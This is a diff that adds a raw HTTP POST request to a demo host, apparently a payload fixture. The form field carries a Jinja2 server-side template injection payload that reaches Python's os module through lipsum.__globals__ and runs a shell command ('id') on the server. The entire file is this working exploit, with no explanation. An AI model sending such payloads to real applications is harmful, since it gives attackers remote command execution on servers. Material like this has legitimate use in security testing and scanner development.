@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Connection: close
+
+id={{lipsum.__globals__[\u0027os\u0027].popen(\u0027id\u0027).read()}}
